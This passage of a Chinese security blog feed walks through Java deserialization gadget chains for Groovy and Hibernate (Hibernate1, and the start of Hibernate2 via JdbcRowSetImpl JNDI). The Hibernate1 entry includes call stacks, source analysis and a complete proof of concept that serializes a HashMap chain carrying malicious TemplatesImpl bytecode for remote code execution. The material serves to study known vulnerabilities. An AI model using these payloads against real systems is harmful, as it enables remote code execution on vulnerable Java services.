class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">        MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719191853074.png" alt="image-20230719191853074"></p><p>调用entrySet，然后触发invoke</p><p><img src="../images/image-20230719192046197.png" alt="image-20230719192046197"></p><p>调用了<code>ConversionHandler#invoke()</code>方法</p><p><img src="../images/image-20230719192158196.png" alt="image-20230719192158196"></p><p><img src="../images/image-20230719192238123.png" alt="image-20230719192238123"></p><p>接着就会调用到<code>ConvertedClosure#invokeCustom()</code>方法   <strong>并且由于这个</strong></p><p><strong><code>methodName</code>和这个传进来的<code>method</code>的<code>name</code>一样 </strong> 就会调用<code>call</code>()方法</p><p><img src="../images/image-20230719192521353.png" alt="image-20230719192521353"></p><p><img src="../images/image-20230719192653618.png" alt="image-20230719192653618"></p><p>这里的话到最后就rce了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了</summary>
      
    
    
    
    
    <category term="java-Groovy" scheme="https://ke1nys.github.io/tags/java-Groovy/"/>
    
  </entry>
  
  <entry>
    <title>show-XXE</title>
    <link href="https://ke1nys.github.io/posts/9d7a060.html"/>
    <id>https://ke1nys.github.io/posts/9d7a060.html</id>
    <published>2023-07-14T09:51:43.000Z</published>
    <updated>2023-07-19T11:38:38.089Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a57f27d4864f5e5500d24962cb2c714021c6ed7e1cde1069c46baeeb16e50bdd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-XXE" scheme="https://ke1nys.github.io/tags/show-XXE/"/>
    
  </entry>
  
  <entry>
    <title>java-Hibernate</title>
    <link href="https://ke1nys.github.io/posts/3531a825.html"/>
    <id>https://ke1nys.github.io/posts/3531a825.html</id>
    <published>2023-07-11T14:07:32.000Z</published>
    <updated>2023-07-19T11:38:38.086Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">参考链接1 </a>       <a href="https://su18.org/post/ysoserial-su18-3/#hibernate1">参考链接2</a></p><h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><p>这也是可以通过调用任意getter函数来进行代码执行的一个类</p><p><strong>首先先给上调用栈</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>我们还是老样子 从能够执行命令的地方开始分析</strong></p><p><code>BasicPropertyAccessor#get</code>  方法</p><p><img src="../images/image-20230711230854168.png" alt="image-20230711230854168"></p><p>这个的话是可以调用任意方法</p><p><strong>这里可控的两点就是<code>method</code>和这个<code>target</code>参数</strong></p><p><code>BasicPropertyAccessor#BasicGetter</code>  方法</p><p><img src="../images/image-20230711231133798.png" alt="image-20230711231133798"></p><p>这个类的构造方法是可以设置这个<code>method</code>方法的</p><p><code>BasicPropertyAccessor#creatGetter</code>  方法</p><p><img src="../images/image-20230711231410524.png" alt="image-20230711231410524"></p><p>跟进这个方法</p><p><code>BasicPropertyAccessor#getGetterOrNull</code>   方法</p><p><img src="../images/image-20230711231507249.png" alt="image-20230711231507249"></p><p>接着跟进这个方法</p><p><code>BasicPropertyAccessor#getterMethod</code>  方法</p><p><img src="../images/image-20230711231538300.png" alt="image-20230711231538300"></p><ul><li>首先第一步就是先获取到这个<code>theClass</code>这个类里的所有方法</li><li>然后判断这些方法是是否存在参数  如果存在参数的话就退出</li><li>接着就判断无参数的方法是否是<code>get</code>或者<code>is</code>开头的</li><li>如果满足以上条件的话就将get或is后面的东西转化为小写并返回</li></ul><p><img src="../images/image-20230711231914096.png" alt="image-20230711231914096"></p><p>在<code>BasicPropertyAccessor#getterMethod</code>执行完后  就会将method进行返回  然后就返回<code>BasicGetter</code>的构造方法  这样的话就给<code>method</code>给配置完成了</p><p><strong>知道上述的东西参数怎么配置完之后  我们就得找找谁能调用这个<code>get</code>方法</strong></p><p>经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p>​    <img src="../images/image-20230711232825523.png" alt="image-20230711232825523"></p><p>就是这两个方法</p><p><strong>接着找谁调用了<code>getPropertyValues</code>()方法，由于这是抽象类，因此该找实现类哪里调用了</strong></p><p><strong>但是抽象类我们无法调用，只能使用它的子类，</strong><code>AbstractComponentTuplizer</code> 有两个子类，一个是 <code>PojoComponentTuplizer</code>，一个是 <code>DynamicMapComponentTuplizer</code>，这对应着 <code>Hibernate</code> 的实体对象的类型，即 <code>pojo</code> 和 <code>dynamic-map</code>。<code>pojo</code> 代表将 <code>Hibernate</code> 类型映射为 Java 实体类，而 <code>dynamic-map</code> 将映射为 Map 对象。</p><p>这里选择 <code>PojoComponentTuplizer</code> 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getPropertyValues(Object component) <span class="keyword">throws</span> HibernateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (component == BackrefPropertyAccessor.UNKNOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.propertySpan];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.optimizer != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.optimizer.getAccessOptimizer() != <span class="literal">null</span> ? <span class="built_in">this</span>.optimizer.getAccessOptimizer().getPropertyValues(component) : <span class="built_in">super</span>.getPropertyValues(component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230712114037350.png" alt="image-20230712114037350"></p><p><strong>这里就是会调用到父类里的<code>getPropertyValues</code>方法</strong></p><p>而这个方法在<code>ComponentType</code>中又被调用</p><p><img src="../images/image-20230713002720265.png" alt="image-20230713002720265"></p><p>这里让<code>componentTuplizer</code>为<code>PojoComponentTuplizer</code>即可接上链子，而在该类的<code>getHashcode</code>方法中又调用了<code>getPropertyValue</code></p><p><img src="../images/image-20230713004928706.png" alt="image-20230713004928706"></p><p>此现在该着哪里可以接上<code>getHashcode</code>，这里就再正向分析一波，首先找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用<code>getHashcode</code>了的</p><p><img src="../images/image-20230713005144028.png" alt="image-20230713005144028"></p><p>那么就接着找谁调用了这个<code>initTransients</code>   这个方法</p><p><img src="../images/image-20230713005401438.png" alt="image-20230713005401438"></p><p>最后在这个<code>ValueHolder#getValue()</code>里带调用了这个<code>initialize</code>方法</p><p><strong>那么这个<code>getValue</code>方法是在这个<code>TypedValue#hashCode()</code>方法来调用</strong></p><p><img src="../images/image-20230713005511693.png" alt="image-20230713005511693"></p><p>（这个<code>this.hashcode</code>是在调用这个<code>initialize</code>的时候来给赋值的)</p><p><img src="../images/image-20230713005654920.png" alt="image-20230713005654920"></p><p><strong>那么我们现在就走到了<code>TypedValue#hashcode</code>这个方法这里了</strong></p><p><strong>那么有经验的师傅就能想到使用<code>hashMap</code>来当入口来触发了</strong></p><p><strong>(就是最外层就是<code>hashMap</code>)</strong></p><p><strong>POC如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span>  <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(tmpl.getClass(), method, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713233831925.png" alt="image-20230713233831925"></p><p><strong>完整的利用链</strong></p><p><img src="../images/image-20230713233920372.png" alt="image-20230713233920372"></p><p><strong>这里这样写是因为版本的不同  调用链在这一块也是会不同的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><strong>利用说明：</strong><ul><li><strong>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</strong></li></ul></li></ol><ol><li>依赖版本</li></ol><p><strong>Hibernate : 3-5</strong></p><ol><li><strong>本次复现用的依赖版本</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.11.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713234611171.png" alt="image-20230713234611171"></p><p><strong>这位师傅提出了一个想法  可以学习一下为什么</strong>   </p><h2 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h2><p>既然是触发 <code>getter</code> 方法，这就让我们想到了 <code>fastjson</code> 的经典触发方式，除了 <code>TemplatesImpl</code> 实例化恶意类字节码，还有 <code>JdbcRowSetImpl</code> 触发恶意 <code>JNDI</code> 查询，<code>Hibernate2</code> 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p><p>在 <code>fastjson</code> 中使用 <code>JdbcRowSetImpl</code> 的 <code>setAutoCommit</code>（setter）方法触发 <code>JNDI</code> 查询，而在 <code>Hibernate2</code> 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title 